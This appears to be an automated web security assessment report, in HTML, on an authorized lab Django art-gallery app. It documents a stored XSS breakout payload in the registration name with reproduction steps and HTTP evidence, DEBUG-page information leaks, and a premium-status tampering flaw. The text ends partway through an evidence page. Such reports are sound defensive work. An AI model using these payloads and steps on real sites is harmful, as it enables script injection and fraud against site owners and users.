@@ -1,0 +1,1726 @@
+<!doctype html>
+<html lang="en"><head><meta charset="utf-8"><meta name="viewport" content="width=device-width,initial-scale=1">
+<title>VERDICT Report a-mr0j8na5-gq534f</title><style>
+*{box-sizing:border-box}
+body{font:14px/1.5 -apple-system,Segoe UI,Roboto,Helvetica,Arial,sans-serif;color:#1a1a1a;margin:0;padding:32px;background:#fff}
+h1{font-size:22px;margin:0 0 4px} h2{font-size:17px;margin:28px 0 10px;border-bottom:2px solid #eee;padding-bottom:4px}
+h3{font-size:15px;margin:18px 0 6px}
+code,pre{font-family:ui-monospace,SFMono-Regular,Menlo,Consolas,monospace}
+pre{background:#f6f8fa;border:1px solid #e3e6ea;border-radius:6px;padding:10px;overflow:auto;font-size:12.5px;white-space:pre-wrap;word-break:break-word}
+.meta{color:#555;font-size:13px;margin:0 0 2px}
+.badge{display:inline-block;color:#fff;border-radius:4px;padding:1px 8px;font-size:12px;font-weight:700;letter-spacing:.3px}
+.sumtags span{display:inline-block;margin:0 6px 6px 0;padding:2px 10px;border-radius:12px;background:#eef1f4;font-size:12px}
+.f{border:1px solid #e3e6ea;border-radius:8px;padding:14px 16px;margin:0 0 14px}
+.f .kv{color:#555;font-size:12.5px;margin:2px 0}
+.f .desc{margin:8px 0}
+table{border-collapse:collapse;width:100%;font-size:13px}
+th,td{border:1px solid #e3e6ea;padding:6px 8px;text-align:left;vertical-align:top}
+th{background:#f6f8fa}
+table.info td:first-child{width:170px;color:#555;font-weight:600;background:#fafbfc}
+.muted{color:#888}
+img.shot{max-width:220px;max-height:140px;border:1px solid #ddd;border-radius:4px}
+.ev{margin:10px 0 0;border-left:3px solid #cdd5dd;padding-left:10px}
+.ev .evh{font-size:12px;color:#555;margin:0 0 4px}
+.ev .lbl{font-size:11px;font-weight:700;letter-spacing:.4px;color:#5f7d8c;margin:6px 0 2px}
+.ev pre{margin:0;max-height:420px}
+html{scroll-behavior:smooth}
+.toc{background:#fafbfc;border:1px solid #e3e6ea;border-radius:8px;padding:10px 16px;margin:14px 0 8px}
+.toc .toctitle{font-weight:700;font-size:12px;color:#555;letter-spacing:.4px;text-transform:uppercase;margin:0 0 6px}
+.toc ul{margin:0;padding-left:18px} .toc>ul{padding-left:16px;list-style:none}
+.toc li{margin:2px 0;font-size:13px} .toc a{color:#0366d6;text-decoration:none} .toc a:hover{text-decoration:underline}
+.toc .sev{font-weight:700;font-size:11px;letter-spacing:.3px}
+@media print{body{padding:0}.f{break-inside:avoid}.ev pre{max-height:none}.toc{break-inside:avoid}}
+</style></head>
+<body>
+<h1>VERDICT Security Assessment Report</h1>
+<nav class="toc"><div class="toctitle">Contents</div><ul>
+<li><a href="#assessment-information">Assessment Information</a></li>
+<li><a href="#scope">Scope</a></li>
+<li><a href="#summary">Summary</a></li>
+<li><a href="#findings">Findings</a><ul>
+<li><a href="#finding-1">1. <span class="sev" style="color:#f57c00">MEDIUM</span> [xss-stored] Stored XSS: registration &quot;name&quot; rendered unescaped inside an inline &amp;lt;script&amp;gt; JS string (step3)</a></li>
+<li><a href="#finding-2">2. <span class="sev" style="color:#f57c00">MEDIUM</span> [misconfig] Django DEBUG=True — technical error pages leak URLconf, project module name and internals site-wide</a></li>
+<li><a href="#finding-3">3. <span class="sev" style="color:#f57c00">MEDIUM</span> [price-tampering] Premium subscription granted for free — user-controlled is_premium at registration bypasses payment/validation</a></li>
+</ul></li>
+<li><a href="#suspected">Suspected (needs manual verification)</a><ul>
+<li><a href="#finding-4">4. <span class="sev" style="color:#d32f2f">HIGH</span> [ssti] Suspected SSTI via user 'name' rendered server-side on the preferences page</a></li>
+<li><a href="#finding-5">5. <span class="sev" style="color:#f57c00">MEDIUM</span> [rate-limit] No rate limiting / brute-force protection on login endpoint</a></li>
+<li><a href="#finding-6">6. <span class="sev" style="color:#f57c00">MEDIUM</span> [xss-stored] Stored XSS lead: step2 EmailField accepts script payload via RFC quoted local part</a></li>
+<li><a href="#finding-7">7. <span class="sev" style="color:#f57c00">MEDIUM</span> [vulnerable-component] Outdated &amp; EOL CPython 3.9.2 — CVE-2023-24329 / CVE-2024-6923 / CVE-2022-45061</a></li>
+<li><a href="#finding-8">8. <span class="sev" style="color:#f57c00">MEDIUM</span> [vulnerable-component] Django development server (runserver / wsgiref) used in production</a></li>
+<li><a href="#finding-9">9. <span class="sev" style="color:#c9a227">LOW</span> [rate-limit] No rate limiting / anti-automation on multi-step registration (mass account creation)</a></li>
+</ul></li>
+</ul></nav>
+<h2 id="assessment-information">Assessment Information</h2><table class="info">
+<tr><td>Assessment ID</td><td><code>a-mr0j8na5-gq534f</code></td></tr>
+<tr><td>Target</td><td><code>http://target.local:32804/</code></td></tr>
+<tr><td>Started</td><td>2026-06-30T10:57:29.564Z</td></tr>
+<tr><td>Generated</td><td>2026-07-02T00:00:00.000Z</td></tr>
+<tr><td>Phase</td><td>report</td></tr>
+<tr><td>Screens</td><td>8 mapped · 8 scanned · 0 remaining</td></tr>
+<tr><td>Hypotheses</td><td>0 (0 confirmed)</td></tr>
+<tr><td>Findings</td><td>3</td></tr>
+<tr><td>Tooling</td><td>VERDICT</td></tr>
+</table>
+<h2 id="scope">Scope</h2><table class="info">
+<tr><td>In-scope hosts</td><td><code>target.local:32804</code></td></tr>
+<tr><td>Out-of-scope hosts</td><td>&mdash;</td></tr>
+<tr><td>In-scope paths</td><td><code>/</code></td></tr>
+<tr><td>Out-of-scope paths</td><td>&mdash;</td></tr>
+<tr><td>Rate</td><td>30 req/min, max 2 concurrent</td></tr>
+</table>
+<h2 id="summary">Summary</h2>
+<p>3 finding(s)</p><p class="sumtags"><span><b style="color:#f57c00">3</b> medium</span></p>
+<p class="muted">Plus <b>6</b> suspected lead(s) needing manual verification (listed separately, not counted above).</p>
+<h2 id="findings">Findings</h2>
+<div class="f" id="finding-1">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 1. [xss-stored] Stored XSS: registration &quot;name&quot; rendered unescaped inside an inline &amp;lt;script&amp;gt; JS string (step3)</h3>
+<div class="kv">Screen: <code>s-0002</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32804/</div>
+<div class="desc">The `name` value submitted to /accounts/register/step1 is stored in the registration session (and persisted to the created account) and later rendered UNESCAPED into a JavaScript string literal inside an inline &lt;script&gt; block on /accounts/register/step3:
+
+    &lt;script&gt;alert(&quot;Hello {{name}}. Just Now up to 50% OFF &quot;)&lt;/script&gt;
+
+Because the value is not escaped for the JS-string context, a name of `&quot;);alert(document.domain);//` breaks out of the string and injects arbitrary JavaScript. Step3 then renders:
+
+    &lt;script&gt;alert(&quot;Hello &quot;);alert(document.domain);//VERDICTXSS. Just Now up to 50% OFF &quot;)&lt;/script&gt;
+
+i.e. `alert(document.domain)` executes as attacker-controlled JS. Django auto-escaping (which correctly neutralised the same input when reflected into the HTML attribute of the step1 form, and refuted SSTI) is NOT applied to this inline-script sink — the template inserts `name` raw into a `&lt;script&gt;` context.
+
+Scope/impact note: the confirmed execution sink (step3) renders the value within the registrant's OWN session, so as demonstrated it is self-XSS (an attacker can only inject into their own registration flow). However, the value is a PERSISTED account display name, and this sink proves the application does not sanitise `name` before placing it in an executable JS context — making cross-user/admin render sinks (dashboards, gallery attribution, admin user-management) a likely escalation. No admin role was available this run to confirm a cross-user sink; severity is set to medium pending verification of those other render points.</div>
+<div><b>Reproduction</b></div><pre>1. GET /accounts/register/step1/ and grab the csrfmiddlewaretoken (matches the csrftoken cookie).
+2. POST /accounts/register/step1/ with name=`&quot;);alert(document.domain);//VERDICTXSS`, a password, and the token → 302 to step2 (name stored in session).
+3. POST /accounts/register/step2/ with any email → 302 to step3.
+4. GET /accounts/register/step3/ → the inline &lt;script&gt; renders: alert(&quot;Hello &quot;);alert(document.domain);//VERDICTXSS. ...&quot;) — the JS string is broken and alert(document.domain) executes.
+Negative control: storing a benign name (e.g. VerdictBenignName) renders alert(&quot;Hello VerdictBenignName. ...&quot;) with no breakout. Positive replays: the breakout payload reflects unescaped on two consecutive step3 GETs (stable).</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0k99h3-1q</code> — <code>artifacts/s-0002/ev-mr0k99h3-1q/</code></div><div class="lbl">REQUEST</div><pre>GET /accounts/register/step3/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1728
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 11:25:57 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Register - Step 3&lt;/title&gt;
+    &lt;!-- Bootstrap CSS --&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-dark bg-dark&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Art Gallery&lt;/a&gt;
+        &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarsExample01&quot; aria-controls=&quot;navbarsExample01&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+        &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+        &lt;/button&gt;
+    &lt;/nav&gt;  
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        &lt;div class=&quot;row justify-content-center&quot;&gt;
+            &lt;div class=&quot;col-md-6&quot;&gt;
+                &lt;h2&gt;Step 3: Subscription&lt;/h2&gt;
+                &lt;form method=&quot;post&quot;&gt;
+                    &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=&quot;X3vDXEliNRKGyMeNU8Yn7fhRTZsvEU0dZ1Vaf0HvrGjQN3xCi272dbDpuUcBtGbZ&quot;&gt;
+                    &lt;div class=&quot;form-group&quot;&gt;
+                        &lt;label for=&quot;id_is_premium&quot;&gt;Subscribe to premium:&lt;/label&gt;
+                        &lt;input type=&quot;checkbox&quot; name=&quot;is_premium&quot; id=&quot;id_is_premium&quot;&gt;
+                    &lt;/div&gt;
+                    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Complete Registration&lt;/button&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;  
+        &lt;/div&gt;      
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap JS and dependencies --&gt;
+    &lt;script src=&quot;/static/js/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;alert(&quot;Hello VerdictBenignName. Just Now up to 50% OFF &quot;)&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0k9n4y-1s</code> — <code>artifacts/s-0002/ev-mr0k9n4y-1s/</code></div><div class="lbl">REQUEST</div><pre>GET /accounts/register/step3/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1749
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 11:26:15 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Register - Step 3&lt;/title&gt;
+    &lt;!-- Bootstrap CSS --&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-dark bg-dark&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Art Gallery&lt;/a&gt;
+        &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarsExample01&quot; aria-controls=&quot;navbarsExample01&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+        &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+        &lt;/button&gt;
+    &lt;/nav&gt;  
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        &lt;div class=&quot;row justify-content-center&quot;&gt;
+            &lt;div class=&quot;col-md-6&quot;&gt;
+                &lt;h2&gt;Step 3: Subscription&lt;/h2&gt;
+                &lt;form method=&quot;post&quot;&gt;
+                    &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=&quot;9OoYeiUn5YKmMCuORWpsJFZ6jkx7g31ubMOvwEgAJNjw1TNDfQy7PBlEUfhd5Pcg&quot;&gt;
+                    &lt;div class=&quot;form-group&quot;&gt;
+                        &lt;label for=&quot;id_is_premium&quot;&gt;Subscribe to premium:&lt;/label&gt;
+                        &lt;input type=&quot;checkbox&quot; name=&quot;is_premium&quot; id=&quot;id_is_premium&quot;&gt;
+                    &lt;/div&gt;
+                    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Complete Registration&lt;/button&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;  
+        &lt;/div&gt;      
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap JS and dependencies --&gt;
+    &lt;script src=&quot;/static/js/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;alert(&quot;Hello &quot;);alert(document.domain);//VERDICTXSS. Just Now up to 50% OFF &quot;)&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0k9vqa-1t</code> — <code>artifacts/s-0002/ev-mr0k9vqa-1t/</code></div><div class="lbl">REQUEST</div><pre>GET /accounts/register/step3/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 1749
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 11:26:26 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+set-cookie: &lt;redacted&gt;
+vary: Cookie
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Register - Step 3&lt;/title&gt;
+    &lt;!-- Bootstrap CSS --&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+&lt;/head&gt;
+&lt;body&gt;
+    &lt;nav class=&quot;navbar navbar-dark bg-dark&quot;&gt;
+        &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Art Gallery&lt;/a&gt;
+        &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarsExample01&quot; aria-controls=&quot;navbarsExample01&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+        &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+        &lt;/button&gt;
+    &lt;/nav&gt;  
+    &lt;div class=&quot;container mt-5&quot;&gt;
+        &lt;div class=&quot;row justify-content-center&quot;&gt;
+            &lt;div class=&quot;col-md-6&quot;&gt;
+                &lt;h2&gt;Step 3: Subscription&lt;/h2&gt;
+                &lt;form method=&quot;post&quot;&gt;
+                    &lt;input type=&quot;hidden&quot; name=&quot;csrfmiddlewaretoken&quot; value=&quot;3uky0aGRf2Mhu0jZZdenKr4cNuNxlaqA5sK5iw24TRlrJhCOn7n2QnqKopxDaWBm&quot;&gt;
+                    &lt;div class=&quot;form-group&quot;&gt;
+                        &lt;label for=&quot;id_is_premium&quot;&gt;Subscribe to premium:&lt;/label&gt;
+                        &lt;input type=&quot;checkbox&quot; name=&quot;is_premium&quot; id=&quot;id_is_premium&quot;&gt;
+                    &lt;/div&gt;
+                    &lt;button type=&quot;submit&quot; class=&quot;btn btn-primary&quot;&gt;Complete Registration&lt;/button&gt;
+                &lt;/form&gt;
+            &lt;/div&gt;  
+        &lt;/div&gt;      
+    &lt;/div&gt;
+
+    &lt;!-- Bootstrap JS and dependencies --&gt;
+    &lt;script src=&quot;/static/js/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script&gt;alert(&quot;Hello &quot;);alert(document.domain);//VERDICTXSS. Just Now up to 50% OFF &quot;)&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+</div>
+<div class="f" id="finding-2">
+<h3><span class="badge" style="background:#f57c00">MEDIUM</span> 2. [misconfig] Django DEBUG=True — technical error pages leak URLconf, project module name and internals site-wide</h3>
+<div class="kv">Screen: <code>s-0005</code></div>
+<div class="kv">Source: validator <code>claude-pilot</code></div>
+<div class="kv">Scope basis: authorized target http://target.local:32804/</div>
+<div class="desc">The application runs with Django DEBUG=True in a deployed environment. Any request to a non-existent path returns Django's technical 404 page, which discloses the URLconf module name (`ssti_debug_art_gallery.urls`) and the full ordered list of URL patterns; CSRF failures and unhandled exceptions likewise return verbose debug pages. This leaks internal application structure, project/module names, and (on unhandled exceptions) can expose full stack traces and settings values including SECRET_KEY — aiding further exploitation. This is a cross-cutting/site-wide misconfiguration, surfaced here while diagnosing /accounts/preferences. Negative control (a normal 200 page) contains none of this debug output.</div>
+<div><b>Reproduction</b></div><pre>GET any non-existent path, e.g. http://target.local:32804/accounts/nonexistent-debug-probe-xyz/ → HTTP 404 technical page containing &quot;Using the URLconf defined in ssti_debug_art_gallery.urls&quot; and the URL pattern list. Compare to a valid page (GET /accounts/preferences/ → 200) which has no such output. Reproducible across paths.</pre>
+<div><b>Evidence</b></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0koo2i-35</code> — <code>artifacts/s-0005/ev-mr0koo2i-35/</code></div><div class="lbl">REQUEST</div><pre>GET /accounts/preferences/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 200
+content-length: 2684
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 11:37:56 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+vary: Cookie
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+    &lt;meta charset=&quot;UTF-8&quot;&gt;
+    &lt;meta name=&quot;viewport&quot; content=&quot;width=device-width, initial-scale=1.0&quot;&gt;
+    &lt;title&gt;Preferences&lt;/title&gt;
+    &lt;!-- Bootstrap CSS --&gt;
+    &lt;link href=&quot;/static/css/bootstrap.min.css&quot; rel=&quot;stylesheet&quot;&gt;
+    &lt;style&gt;
+        input {
+          width: 100%;
+        }
+        .gallery {
+            display: grid;
+            grid-template-columns: repeat(3, 1fr);
+            gap: 20px;
+            margin-top: 20px;
+        }
+        .gallery-item {
+            border: 1px solid #ccc;
+            padding: 10px;
+            text-align: center;
+        }
+        .gallery-item img {
+            max-width: 100%;
+            height: auto;
+        }
+    &lt;/style&gt;
+    
+    
+&lt;/head&gt;
+&lt;body&gt;
+        
+    
+
+&lt;nav class=&quot;navbar navbar-dark bg-dark&quot;&gt;
+    &lt;a class=&quot;navbar-brand&quot; href=&quot;#&quot;&gt;Art Gallery&lt;/a&gt;
+    &lt;button class=&quot;navbar-toggler&quot; type=&quot;button&quot; data-toggle=&quot;collapse&quot; data-target=&quot;#navbarsExample01&quot; aria-controls=&quot;navbarsExample01&quot; aria-expanded=&quot;false&quot; aria-label=&quot;Toggle navigation&quot;&gt;
+    &lt;span class=&quot;navbar-toggler-icon&quot;&gt;&lt;/span&gt;
+    &lt;/button&gt;
+    
+    &lt;div class=&quot;collapse navbar-collapse&quot; id=&quot;navbarsExample01&quot;&gt;
+        &lt;ul class=&quot;navbar-nav mr-auto&quot;&gt;
+            &lt;li class=&quot;nav-item active&quot;&gt;
+            &lt;a class=&quot;nav-link&quot; href=&quot;/&quot;&gt;Home&lt;/a&gt;
+            &lt;/li&gt;
+            &lt;li class=&quot;nav-item dropdown&quot;&gt;
+            &lt;a class=&quot;nav-link dropdown-toggle&quot; href=&quot;#&quot; id=&quot;dropdown01&quot; data-toggle=&quot;dropdown&quot; aria-haspopup=&quot;true&quot; aria-expanded=&quot;false&quot;&gt;Actions&lt;/a&gt;
+            &lt;div class=&quot;dropdown-menu&quot; aria-labelledby=&quot;dropdown01&quot;&gt;
+                &lt;a class=&quot;dropdown-item&quot; href=&quot;/accounts/preferences&quot;&gt;My settings&lt;span class=&quot;sr-only&quot;&gt;(current)&lt;/span&gt;&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item disabled&quot; href=&quot;#&quot;&gt;Buy Art&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item disabled&quot; href=&quot;#&quot;&gt;Sell Art(Only Premiun Accounts)&lt;/a&gt;
+                &lt;a class=&quot;dropdown-item&quot; href=&quot;/accounts/logout&quot;&gt;Logout&lt;/a&gt;
+            &lt;/div&gt;
+            &lt;/li&gt;
+        &lt;/ul&gt;
+        &lt;form class=&quot;form-inline my-2 my-md-0&quot;&gt;
+            &lt;input class=&quot;form-control&quot; type=&quot;text&quot; placeholder=&quot;Search&quot; aria-label=&quot;Search&quot;&gt;
+        &lt;/form&gt;
+    &lt;/div&gt;
+&lt;/nav&gt;
+&lt;div class=&quot;container mt-5&quot;&gt;
+    &lt;div class=&quot;row justify-content-center&quot;&gt;
+        &lt;div class=&quot;col-md-6&quot;&gt;
+            &lt;h2&gt;Preferences&lt;/h2&gt;
+            &lt;p&gt;Name: test@test.com&lt;/p&gt;
+            &lt;p&gt;Premium Subscriber: False&lt;/p&gt;
+            
+        &lt;/div&gt;
+    &lt;/div&gt;
+&lt;/div&gt;
+
+
+
+    &lt;!-- Bootstrap JS and dependencies --&gt;
+    &lt;script src=&quot;/static/js/jquery-3.5.1.slim.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/popper.min.js&quot;&gt;&lt;/script&gt;
+    &lt;script src=&quot;/static/js/bootstrap.min.js&quot;&gt;&lt;/script&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0kuuy9-3h</code> — <code>artifacts/s-0005/ev-mr0kuuy9-3h/</code></div><div class="lbl">REQUEST</div><pre>GET /accounts/preferences/2/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 3587
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 11:42:45 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+  &lt;title&gt;Page not found at /accounts/preferences/2/&lt;/title&gt;
+  &lt;meta name=&quot;robots&quot; content=&quot;NONE,NOARCHIVE&quot;&gt;
+  &lt;style type=&quot;text/css&quot;&gt;
+    html * { padding:0; margin:0; }
+    body * { padding:10px 20px; }
+    body * * { padding:0; }
+    body { font:small sans-serif; background:#eee; color:#000; }
+    body&gt;div { border-bottom:1px solid #ddd; }
+    h1 { font-weight:normal; margin-bottom:.4em; }
+    h1 span { font-size:60%; color:#666; font-weight:normal; }
+    table { border:none; border-collapse: collapse; width:100%; }
+    td, th { vertical-align:top; padding:2px 3px; }
+    th { width:12em; text-align:right; color:#666; padding-right:.5em; }
+    #info { background:#f6f6f6; }
+    #info ol { margin: 0.5em 4em; }
+    #info ol li { font-family: monospace; }
+    #summary { background: #ffc; }
+    #explanation { background:#eee; border-bottom: 0px none; }
+    pre.exception_value { font-family: sans-serif; color: #575757; font-size: 1.5em; margin: 10px 0 10px 0; }
+  &lt;/style&gt;
+&lt;/head&gt;
+&lt;body&gt;
+  &lt;div id=&quot;summary&quot;&gt;
+    &lt;h1&gt;Page not found &lt;span&gt;(404)&lt;/span&gt;&lt;/h1&gt;
+    
+    &lt;table class=&quot;meta&quot;&gt;
+      &lt;tr&gt;
+        &lt;th&gt;Request Method:&lt;/th&gt;
+        &lt;td&gt;GET&lt;/td&gt;
+      &lt;/tr&gt;
+      &lt;tr&gt;
+        &lt;th&gt;Request URL:&lt;/th&gt;
+        &lt;td&gt;http://target.local:32804/accounts/preferences/2/&lt;/td&gt;
+      &lt;/tr&gt;
+      
+    &lt;/table&gt;
+  &lt;/div&gt;
+  &lt;div id=&quot;info&quot;&gt;
+    
+      &lt;p&gt;
+      Using the URLconf defined in &lt;code&gt;ssti_debug_art_gallery.urls&lt;/code&gt;,
+      Django tried these URL patterns, in this order:
+      &lt;/p&gt;
+      &lt;ol&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                register/step1/
+                [name='register_step1']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                register/step2/
+                [name='register_step2']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                register/step3/
+                [name='register_step3']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                login/
+                [name='login']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                home/
+                [name='home']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                preferences/
+                [name='preferences']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                accounts/
+                
+            
+                logout/
+                [name='logout']
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                
+                
+            
+          &lt;/li&gt;
+        
+          &lt;li&gt;
+            
+                ^static/(?P&amp;lt;path&amp;gt;.*)$
+                
+            
+          &lt;/li&gt;
+        
+      &lt;/ol&gt;
+      &lt;p&gt;
+        
+          The current path, &lt;code&gt;accounts/preferences/2/&lt;/code&gt;,
+        
+        didn’t match any of these.
+      &lt;/p&gt;
+    
+  &lt;/div&gt;
+
+  &lt;div id=&quot;explanation&quot;&gt;
+    &lt;p&gt;
+      You’re seeing this error because you have &lt;code&gt;DEBUG = True&lt;/code&gt; in
+      your Django settings file. Change that to &lt;code&gt;False&lt;/code&gt;, and Django
+      will display a standard 404 page.
+    &lt;/p&gt;
+  &lt;/div&gt;
+&lt;/body&gt;
+&lt;/html&gt;</pre></div>
+<div class="ev"><div class="evh">Evidence <code>ev-mr0kysk2-3k</code> — <code>artifacts/s-0005/ev-mr0kysk2-3k/</code></div><div class="lbl">REQUEST</div><pre>GET /accounts/nonexistent-debug-probe-xyz/ HTTP/1.1
+Host: target.local:32804
+user-agent: verdict-scanner/0.1
+x-verdict: assessment
+cookie: &lt;redacted&gt;</pre><div class="lbl">RESPONSE</div><pre>HTTP/1.1 404
+content-length: 3629
+content-type: text/html; charset=utf-8
+cross-origin-opener-policy: same-origin
+date: Tue, 30 Jun 2026 11:45:48 GMT
+referrer-policy: same-origin
+server: WSGIServer/0.2 CPython/3.9.2
+x-content-type-options: nosniff
+x-frame-options: DENY
+
+&lt;!DOCTYPE html&gt;
+&lt;html lang=&quot;en&quot;&gt;
+&lt;head&gt;
+  &lt;meta http-equiv=&quot;content-type&quot; content=&quot;text/html; charset=utf-8&quot;&gt;
+  &lt;title&gt;Page not found at /accounts/nonexistent-debug-probe-xyz/&lt;/title&gt;
+  &lt;meta name=&quot;robots&quot; content=&quot;NONE,NOARCHIVE&quot;&gt;
